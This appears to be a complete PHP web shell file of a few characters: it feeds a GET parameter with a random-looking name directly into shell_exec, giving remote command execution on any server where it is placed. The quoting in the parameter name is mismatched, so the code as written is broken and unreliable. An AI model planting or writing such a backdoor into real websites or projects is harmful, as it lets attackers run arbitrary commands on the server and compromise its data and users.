<?php
shell_exec($_GET["iBYpkkGG']);
?>
